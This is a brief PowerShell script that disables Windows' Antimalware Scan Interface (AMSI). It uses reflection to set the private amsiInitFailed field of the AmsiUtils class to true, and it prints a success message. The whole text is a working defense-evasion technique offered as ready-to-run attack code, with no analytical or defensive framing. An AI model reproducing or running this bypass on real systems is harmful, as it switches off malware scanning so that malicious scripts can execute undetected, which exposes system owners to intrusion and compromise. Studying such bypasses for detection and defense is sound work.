# Get the AmsiUtils .NET type
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
# Access the private static field 'amsiInitFailed'
$field = $amsi.GetField('amsiInitFailed', 'NonPublic,Static')
# Set the field to $true to disable AMSI
$field.SetValue($null, $true)
Write-Host "[+] AMSI Bypassed"